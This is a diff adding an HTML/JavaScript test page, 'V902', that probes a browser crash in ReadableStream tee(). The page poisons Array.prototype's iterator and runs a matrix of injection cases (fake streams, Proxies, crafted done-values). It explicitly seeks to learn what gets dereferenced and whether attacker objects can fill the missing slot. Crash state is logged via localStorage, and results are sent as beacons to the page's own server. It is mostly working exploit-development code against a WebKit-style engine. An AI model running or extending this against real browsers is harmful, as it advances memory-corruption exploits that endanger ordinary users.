@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V902 - tee() iterator injection matrix (fake branch / done-value / protocol probe)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  table { border-collapse:collapse; font-size:12px; margin-top:8px; }
+  td,th { border:1px solid #30363d; padding:3px 7px; text-align:left; }
+  th { color:#58a6ff; }
+  .crash { color:#ff7b72; }
+  .ok { color:#7ee787; }
+</style>
+</head>
+<body>
+<h1>V902 - tee() iterator injection matrix</h1>
+<p>
+Follow-up to V901. V901 proved: poisoning <code>Array.prototype[Symbol.iterator]</code>
+so it yields exactly <b>1</b> item makes <code>tee()</code> hard-crash the WebProcess
+(n1o / n1o2 / n1s all crashed; n2*/n3* were fine), and <code>op=cnt</code> measured
+<code>tee=3</code> iterator next() calls. V902 asks the exploitable questions:
+<b>what exactly gets dereferenced when the iterator under-yields, and can the missing
+slot be supplied by us instead of crashing?</b>
+</p>
+<p>
+One op per page load (one shot per WebProcess), crash-safe via localStorage marker.
+Start: <b>?op=auto</b> &nbsp;|&nbsp; single op: <b>?op=probe</b> &nbsp;|&nbsp; clear: <b>?reset=1</b>
+</p>
+<pre id="out">starting...</pre>
+<div id="tbl"></div>
+<script>
+'use strict';
+/* V902 - how does tee() consume Array.prototype[Symbol.iterator]?
+ *
+ * Measurements per op:
+ *   iterFn  - how many times [Symbol.iterator]() was called
+ *   next    - how many next() calls
+ *   valRead - how many times result.value was READ (accessor)
+ *   doneRead- how many times result.done was READ (accessor)
+ *   ret     - how many times iterator.return() was called
+ *   id0/id1 - was the yielded object itself returned as a branch?
+ *
+ * Injection ops (what if the missing/short item is OUR object?):
+ *   k0    : 0 items, then done                      (expect crash - reference)
+ *   k1    : 1 item, then done                       (expect crash - reference)
+ *   k1dv  : 1 item, then {done:true, value:FAKE}    (does a done-result value get used?)
+ *   k1dvr : 1 item, then {done:true, value:STREAM}
+ *   k1v   : 1 item, then NEVER done (infinite)      (guard - skip unless asked)
+ *   k2o   : 2 plain objects                         (expect OK - n2o baseline)
+ *   k2u8  : 1 plain + 1 Uint8Array                  (wrong type accepted?)
+ *   k2f   : 1 plain + duck-typed fake stream
+ *   k2px  : 1 plain + Proxy that counts property reads
+ *   k2rev : 1 plain + revoked Proxy (any touch throws)
+ *   k2d2  : 2 items but 2nd result has done=true    (done check?)
+ *   k3    : 3 items, then done                      (over-yield baseline)
+ *   ret   : 2 items, iterator.return() armed        (is return() called on cancel?)
+ *   throw2: 2nd next() throws
+ *   self  : [Symbol.iterator] returns a FRESH iterator each call (count calls)
+ *   probe : protocol instrumentation only (no injection)
+ */
+
+var SEEK = location.pathname;
+
+function lsGet(k) { try { return window.localStorage.getItem('v902_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v902_' + k, String(v)); } catch (e) {} }
+function bks(tag, body) {
+  var u = '/beacon/V902-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 450)) +
+          '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+var SAVED = Array.prototype[Symbol.iterator];
+function restoreIter() { try { Array.prototype[Symbol.iterator] = SAVED; } catch (e) {} }
+
+/* ---------- helpers ---------- */
+function mkStream() { return new ReadableStream({ start: function () {}, pull: function () {}, cancel: function () {} }); }
+function mkClosed() { return new ReadableStream({ start: function (c) { c.close(); } }); }
+function plainTee() { return mkClosed().tee(); }
+
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 90) : 'none'; }
+function safeType(v) { try { return typeof v; } catch (e) { return 'E'; } }
+function safeInst(v) { try { return v instanceof ReadableStream; } catch (e) { return 'E'; } }
+function safeLocked(v) { try { return String(v.locked); } catch (e) { return 'throw:' + (e && e.name); } }
+function describe(z, extra, refs) {
+  if (!z) return 'null' + (extra ? ',' + extra : '');
+  var s = 'len=' + z.length;
+  s += ',t0=' + safeType(z[0]) + ',t1=' + safeType(z[1]);
+  s += ',i0=' + safeInst(z[0]) + ',i1=' + safeInst(z[1]);
+  s += ',l0=' + safeLocked(z[0]) + ',l1=' + safeLocked(z[1]);
+  if (refs) s += ',id0=' + (z[0] === refs[0]) + ',id1=' + (z[1] === refs[1]);
+  if (extra) s += ',' + extra;
+  return s;
+}
+
+/* counters */
+var ITERFN = 0, NEXT = 0, VAL_READ = 0, DONE_READ = 0, RETCALL = 0, PROP_READ = 0;
+function zeroCounters() { ITERFN = NEXT = VAL_READ = DONE_READ = RETCALL = PROP_READ = 0; }
+function counters() {
+  return 'iterFn=' + ITERFN + ',next=' + NEXT + ',valRead=' + VAL_READ +
+         ',doneRead=' + DONE_READ + ',ret=' + RETCALL + ',propRead=' + PROP_READ;
+}
+
+/* run tee() under a fresh iterator factory, restore prototype afterwards */
+function runTee(makeIter) {
+  var z = null, err = 'none';
+  Array.prototype[Symbol.iterator] = function () { ITERFN++; return makeIter(this); };
+  try { z = plainTee(); } catch (e) { err = errOf(e); }
+  restoreIter();
+  if (z) {
+    try { z[0] && z[0].cancel(); } catch (e) {}
+    try { z[1] && z[1].cancel(); } catch (e) {}
+  }
+  return { z: z, err: err };
+}
+
+/* result objects with instrumented accessors so we SEE protocol reads */
+function mkRes(v, d) {
+  var o = {};
+  Object.defineProperty(o, 'value', {
+    get: function () { VAL_READ++; return v; }, enumerable: true, configurable: true
+  });
+  Object.defineProperty(o, 'done', {
+    get: function () { DONE_READ++; return d; }, enumerable: true, configurable: true
+  });
+  return o;
+}
+function shell(nextFn, retFn) {
+  var it = { next: nextFn };
+  if (retFn) it['return'] = retFn;
+  it[Symbol.iterator] = function () { return this; };
+  return it;
+}
+
+/* generic fixed-value iterator: yields vals[i] with done=false, then doneValue with done=true */
+function fixedIter(vals, doneValue, withReturn) {
+  var i = 0;
+  return shell(function () {
+    NEXT++;
+    if (i < vals.length) return mkRes(vals[i++], false);
+    return mkRes(doneValue, true);
+  }, withReturn ? function () { RETCALL++; return { done: true }; } : null);
+}
+
+/* ---------- ops ---------- */
+function opProbe() {
+  var refs = [mkStream(), mkStream()];
+  var r = runTee(function () { return fixedIter(refs, undefined, true); });
+  return { ok: true, detail: describe(r.z, 'err=' + r.err + ',' + counters(), refs) };
+}
+
+function opCtl() {
+  var r = runTee(function () { return SAVED.call([1, 2]); });
+  return { ok: true, detail: describe(r.z, 'err=' + r.err + ',' + counters()) };
+}
+
+function opYield(vals, doneValue, opts) {
+  opts = opts || {};
+  var refs = opts.refs || null;
+  var r = runTee(function () {
+    if (opts.freshIter) {
+      return shell(function () {
+        NEXT++;
+        if (NEXT - 1 < vals.length) return mkRes(vals[NEXT - 1], false);
+        return mkRes(doneValue, true);
+      }, opts.withReturn ? function () { RETCALL++; return { done: true }; } : null);
+    }
+    return fixedIter(vals, doneValue, opts.withReturn);
+  });
+  return { ok: true, detail: describe(r.z, 'err=' + r.err + ',' + counters(), refs), refs: refs };
+}
+
+function opK0() { return opYield([], undefined); }
+function opK1() { return opYield([{ fake: 1 }], undefined); }
+function opK1dv() { var f = { fake: 'doneval' }; return opYield([{ fake: 1 }], f, { refs: [null, f] }); }
+function opK1dvr() { var s = mkStream(); return opYield([{ fake: 1 }], s, { refs: [null, s] }); }
+function opK2o() { var a = { fake: 0 }, b = { fake: 1 }; return opYield([a, b], undefined, { refs: [a, b] }); }
+function opK2u8() { var a = { fake: 0 }, b = new Uint8Array(64); return opYield([a, b], undefined, { refs: [a, b] }); }
+function opK2f() {
+  var a = { fake: 0 };
+  var f = {
+    getReader: function () { return { read: function () { return Promise.resolve({ done: true, value: undefined }); }, cancel: function () {} }; },
+    cancel: function () { return Promise.resolve(); },
+    locked: false,
+    tee: function () { return [mkStream(), mkStream()]; }
+  };
+  return opYield([a, f], undefined, { refs: [a, f] });
+}
+function opK2px() {
+  var a = { fake: 0 };
+  var px = new Proxy({}, {
+    get: function (t, p) {
+      PROP_READ++;
+      if (p === Symbol.toPrimitive) return undefined;
+      return undefined;
+    }
+  });
+  return opYield([a, px], undefined, { refs: [a, px] });
+}
+function opK2rev() {
+  var a = { fake: 0 };
+  var rev = typeof Proxy !== 'undefined' && Proxy.revocable ? Proxy.revocable({}, {}) : null;
+  var px = rev ? rev.proxy : {};
+  if (rev) rev.revoke();
+  return opYield([a, px], undefined, { refs: [a, px] });
+}
+function opK2d2() {
+  var a = { fake: 0 }, b = { fake: 1 };
+  var r = runTee(function () {
+    return shell(function () {
+      NEXT++;
+      if (NEXT === 1) return mkRes(a, false);
+      return mkRes(b, true); /* 2nd call: done=true WITH a value */
+    });
+  });
+  return { ok: true, detail: describe(r.z, 'err=' + r.err + ',' + counters(), [a, b]), refs: [a, b] };
+}
+function opK3() { return opYield([{ f: 0 }, { f: 1 }, { f: 2 }], undefined); }
+function opRet() { return opYield([{ f: 0 }, { f: 1 }], undefined, { withReturn: true }); }
+function opThrow2() {
+  var r = runTee(function () {
+    return shell(function () {
+      NEXT++;
+      if (NEXT === 1) return mkRes({ f: 0 }, false);
+      throw new Error('v902-second-next');
+    });
+  });
+  return { ok: true, detail: describe(r.z, 'err=' + r.err + ',' + counters()) };
+}
+function opSelf() {
+  /* fresh iterator object on every [Symbol.iterator]() call */
+  var r = runTee(function (arr) {
+    var i = 0;
+    return shell(function () {
+      NEXT++;
+      if (i < 2) return mkRes(mkStream(), false);
+      return mkRes(undefined, true);
+    });
+  });
+  return { ok: true, detail: describe(r.z, 'err=' + r.err + ',' + counters()) };
+}
+
+/* ---------- runner (same crash-safe pattern as V901) ---------- */
+var SEQUENCE = ['probe', 'ctl', 'k0', 'k1', 'k1dv', 'k1dvr', 'k2o', 'k2u8', 'k2f', 'k2px', 'k2rev', 'k2d2', 'k3', 'ret', 'throw2', 'self'];
+
+function appendRes(s) { lsSet('res', (lsGet('res') || '') + s + ';'); }
+function isDone(op) { return (lsGet('done') || ';').indexOf(';' + op + ';') >= 0; }
+function markDone(op) { var d = lsGet('done') || ';'; if (d.indexOf(';' + op + ';') < 0) lsSet('done', d + op + ';'); }
+function nextOp() { for (var i = 0; i < SEQUENCE.length; i++) { if (!isDone(SEQUENCE[i])) return SEQUENCE[i]; } return null; }
+
+function esc(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
+function render() {
+  var r = lsGet('res') || '';
+  var rows = r.split(';');
+  var html = '<table><tr><th>op</th><th>result</th></tr>';
+  for (var i = 0; i < rows.length; i++) {
+    if (!rows[i]) continue;
+    var p = rows[i].split('|');
+    var cls = (p[1] === 'CRASH') ? 'crash' : 'ok';
+    html += '<tr><td>' + esc(p[0]) + '</td><td class="' + cls + '">' + esc(p[1]) + ' ' + esc(p[2] || '') + '</td></tr>';
+  }
+  html += '</table>';
+  document.getElementById('tbl').innerHTML = html;
+  say('--- recorded so far ---');
+  say(r);
+}
+
+function runOp(op) {
+  zeroCounters();
+  var res;
+  try {
+    if (op === 'probe') res = opProbe();
+    else if (op === 'ctl') res = opCtl();
+    else if (op === 'k0') res = opK0();
+    else if (op === 'k1') res = opK1();
+    else if (op === 'k1dv') res = opK1dv();
+    else if (op === 'k1dvr') res = opK1dvr();
+    else if (op === 'k2o') res = opK2o();
+    else if (op === 'k2u8') res = opK2u8();
+    else if (op === 'k2f') res = opK2f();
+    else if (op === 'k2px') res = opK2px();
+    else if (op === 'k2rev') res = opK2rev();
+    else if (op === 'k2d2') res = opK2d2();
+    else if (op === 'k3') res = opK3();
+    else if (op === 'ret') res = opRet();
+    else if (op === 'throw2') res = opThrow2();
+    else if (op === 'self') res = opSelf();
+    else res = { ok: false, detail: 'unknown-op' };
+  } catch (e) {
+    res = { ok: false, detail: 'THROW:' + errOf(e) };
+  }
+  restoreIter();
+  return res;
+}
+
+function main() {
+  var q = location.search;
+
+  if (q.indexOf('reset=1') >= 0) {
+    try { localStorage.removeItem('v902_cur'); localStorage.removeItem('v902_done'); localStorage.removeItem('v902_res'); } catch (e) {}
+    bks('RESET', 'cleared');
+    say('cleared. reopen with ?op=auto');
+    render();
+    return;
+  }
+
+  var cur = lsGet('cur');
+  if (cur) {
+    appendRes(cur + '|CRASH|');
+    markDone(cur);
+    lsSet('cur', '');
+    bks('CRASH-DETECTED', 'op=' + cur + ',prevLoad=1');
+    say('previous op CRASHED: ' + cur);
+  }
+
+  var m = /[?&]op=([^&]+)/.exec(q);
+  var op = m ? decodeURIComponent(m[1]) : '';
+  var auto = (op === 'auto' || op === '');
+
+  if (auto) {
+    op = nextOp();
+    if (!op) {
+      bks('FINAL', (lsGet('res') || '').slice(0, 450));
+      say('ALL OPS DONE.');
+      render();
+      return;
+    }
+  }
+
+  bks('START', 'op=' + op + ',auto=' + auto);
+  say('running op: ' + op);
+
+  lsSet('cur', op);            /* survives a WebProcess crash */
+
+  var r = runOp(op);
+  var tag = (r.ok === false) ? 'THROW' : (r.noreturn ? 'NO-RETURN' : 'OK');
+  appendRes(op + '|' + tag + '|' + (r.detail || ''));
+  markDone(op);
+  lsSet('cur', '');
+
+  bks('DONE', 'op=' + op + ',tag=' + tag + ',detail=' + (r.detail || ''));
+  say('result: ' + tag + ' ' + (r.detail || ''));
+  render();
+
+  if (auto) {
+    setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, 600);
+  }
+}
+
+try { main(); } catch (e) { bks('FATAL', errOf(e)); say('FATAL ' + errOf(e)); }
+</script>
+</body>
+</html>
